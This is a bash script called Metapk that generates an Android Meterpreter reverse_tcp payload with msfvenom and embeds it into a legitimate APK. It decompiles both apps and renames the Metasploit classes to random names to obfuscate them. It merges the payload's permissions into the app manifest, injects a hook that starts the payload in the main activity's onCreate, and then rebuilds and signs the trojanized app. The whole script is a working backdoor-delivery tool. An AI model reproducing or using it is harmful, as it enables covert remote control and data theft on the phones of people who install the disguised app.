#!/bin/bash
RED='\033[1;31m'
[ $(which bat) != "" ] || {
	echo -e "${RED} Error: Bat Is Required To Run This Software"
	exit 1
}
excode=0
declare -i counter=1
mode="auto"
if ! [ -d "$(pwd)/logs" ]; then
	mkdir "$(pwd)/logs"
fi
logfile="./logs/metapk-`date +%s`.log"

rand_name(){
        echo $(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
        }

obfuscate(){
	if [ "$1" == "" ]; then
	new_met=$(rand_name)
	new_stage=$(rand_name)
	mv original/smali/com/metasploit original/smali/com/$new_met
	mv original/smali/com/$new_met/stage original/smali/com/$new_met/$new_stage
	return
fi
for i in $1/*
        do
                sed -i 's/metasploit/'$new_met'/g' $i
                sed -i 's/stage/'$new_stage'/g' $i
                if [ -d $i ]; then
                        obfuscate $i
                fi
done
}

cleanup(){
	echo "+ Cleaning Up"
	for i in activity file smaliloc.tmp smalifiles; do
		[ ! -f $i ] || rm $i
	done
	rm -rf original/
	rm -rf payload/
	echo "+ Done"
}

manifest(){
	x=$(grep -n -w uses-permission original/AndroidManifest.xml)
        while [ $(wc -l <<<$x) != 1 ]; do
        x=$(sed '1d' <<<$x)
        done
        x=$(sed 's/:.*//' <<<$x)
        x=$(($x+1))
        cat payload/AndroidManifest.xml | grep uses-permission > manifest
        while read -r i || [[ -n $i ]]; do
                sed -i ''$x'i'"\    $i"'' original/AndroidManifest.xml
                x=$((x+1))
        done < manifest
        rm manifest
	embed
	sign
	xcode=$?
	if [ "$xcode" != "0" ]; then
		if [ "$hok" == "1" ]; then
			excode=0
		embed hook
		sign
	fi
	if [ "$xcode" != "0" ]; then
		if ! [ -z "$(grep -w v15 $logfile)" ]; then
			excode=0
		embed fallback
		sign
	fi
	fi	
fi
error_handler


}

error_handler(){
if [ "$excode" != "0" ]; then
		echo "> An Error Occured, See $logfile for details"
		cleanup
		exit 1
	fi
}

browse_smali(){
	for i in "$1"/*;
        do
     filename="${i##*/}"
     base="${filename%.[^.]*}"
     ext="${filename:${#base} + 1}"
        if [ -d $i ]; then
                browse_smali $i
        fi
        if [[ -z "$base" && -n "$ext" ]]; then
        base=".$ext"
        ext="nil"
    fi
        if [ "$ext" == "smali" ]; then
        if [ "$mode" == "manual" ]; then        		
        		if [ "$fl" != "$i" ]; then
        	if ! [ -z "$(cat $i | grep -i "invoke-super.*onCreate(Landroid\/os\/Bundle;)V")" ]; then
        		echo $counter. $i >> smalifiles
        		counter+=1
        	fi        	
        	fl=$i
        	continue
        fi
    
        fi        
        	if [ -z $x ]; then	        		
		exit 1
	fi
               smal=$(echo $i | grep -w $x.smali)
			if [ "$smal" != "" ]; then
				echo $smal > smaliloc.tmp
				actvt=$(cat $smal | grep "\->onCreate(Landroid\/os\/Bundle;)V")
				if [ -z "$actvt" ]; then
					cat $smal | grep Activity > activity
					read -r x < activity					
					x=$(sed 's/.*\///' <<< $x | sed 's/;.*//')										
					browse_smali original $x
					break
				else
					echo $smal
                                	break
				fi
			fi
        fi
done
}

embed(){
	hook=p0
	if [ "$1" == "" ]; then
	echo "+ Embedding Payload Into Original Apk"
	cat original/AndroidManifest.xml | grep \<activity > file
	read -r x < file
	rm file
	x=$(sed 's/.*name="//' <<<$x | sed 's/\".*//' | sed 's/.*\.//')	
	x=$(browse_smali original $x)
	fi

	if [ "$1" == "hook" ]; then
		if ! [ -f smaliloc.tmp ]; then
			echo "> Couldn't Locate Smali File, Choose Another APK"
			cleanup
			exit 1
		fi
		read -r y < smaliloc.tmp
		rm smaliloc.tmp
		x=$(cat $y | grep -w invoke | sed 's/.*\,//' | sed 's/\;.*//' | sed 's/L//').smali
		x=$(tr -d ' ' <<< $x)grep -i "invoke-super.*onCreate.*(Landroid\/os\/Bundle;)V"
		for i in */* ;
			do
				if [ -f $i/$x ]; then
					x=$i/$x
				fi
			done
fi
	if [ -z "$x" ]; then
		hok=1
		return 1
	fi
	while [ "$(wc -l <<< $x)" != "1" ]
		do
			x=$(sed 1d <<< $x)
		done
	if [ "$mode" == "auto" ]; then
	while :
		do
	echo -n "++ Inject Hook Into $(echo $x | sed 's/.*\///')? (Y/n): "
	read -r opt
	opt=$(tr '[:upper:]' '[:lower:]' <<< $opt)	
	case $opt in 		
		n) mode="manual";manual_hook; return;;
		y) break;;
		*) echo "I Don't Think That's A Valid Option";;
esac
done
fi
	
	read -r x <<<$x
	if [ "$x" != "" ]; then
	msg="Injecting Hook Into $x"
		if [ "$1" == "fallback" ]; then
			hook=v0
			ln=$(grep -n -w metasploit $x | sed 's/:.*//')
			sed -i ''$ln'd' $x
			msg="Something Went Wrong, Re-Injecting Hook Into $x"
		fi
		echo "+ $msg"
        	 sed -i '/->onCreate(Landroid\/os\/Bundle;)V/a \    invoke-static {'$hook'}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' $x
else echo "> Could Not Find Smali File To Inject Hook, See $logfile For Details"
	cleanup
	exit 1
        fi
}

manual_hook(){
	echo "++ Looking For Injectable Smali Files"
	ls original  | grep smali > smali_folders
	while read -r folder || [[ -n $folder ]]; do
	#pkg_name=$(cat original/AndroidManifest.xml | grep -w package | sed 's/.*package="//' | sed 's/\".*//')
	#pkg_name=$(dirname $pkg_name)	
	browse_smali original/$folder
	done < smali_folders
	rm smali_folders
	bat smalifiles
	echo -n "Choose Smali File To Inject Hook In ==> "
	read -r opt
	x=$(grep -w $opt smalifiles | sed 's/.*[[:space:]]//')	
	embed "manual"
}

sign(){
echo "+ Building Original Apk"
 ./bin/apktool b original/ >> $logfile 2>&1

	if [ "$?" != "0" ]; then
		excode=1
		return 1
	fi
echo "+ Signing Original Apk"
jarsigner -verbose -keystore ./bin/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA original/dist/*.apk androiddebugkey >>$logfile
	if ! [ -d $(pwd)/output ]; then
		mkdir $(pwd)/output
	fi
cp original/dist/*.apk output/
cleanup
}

cp_payload(){
	cp -r payload/smali/com/metasploit original/smali/com
	echo -n "+ Obfuscating Smali Files"
	obfuscate
	obfuscate original/smali/com/$new_met/$new_stage
	echo "==> I Tried My Best"
	manifest
}

decompile(){
	echo "+ Decompiling Original Apk"
	./bin/apktool empty-framework-dir --force >> $logfile 2>&1
	./bin/apktool d -f -o original $1 >> $logfile 2>&1
	shift
	echo "+ Decompiling Payload"
	./bin/apktool d -f -o payload $1 >> $logfile 2>&1
	cp_payload
}

create(){
	msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=$1 lport=$2 -o backdoor.apk
}

if [ "$1" == "-e" -o "$1" == "--embed" ]; then
	shift
	decompile $@
elif [ "$1" == "--clean" ]; then
	cleanup
elif [ "$1" == "-c" -o "$1" == "create" ]; then
	shift
	create $@
else
printf "Metapk
Version: 1.0.0
Author:Dharmy
Usage: metapk
	-c, --create <lhost> <lport>                Creates A Payload With The specified lhost and lport
	-e, --embed <original apk> <payload>        Decompiles the original apk and payload, embeds the payload, builds the original apk back and signs it
	--clean                                     Cleans Up The Working Directory
"
fi
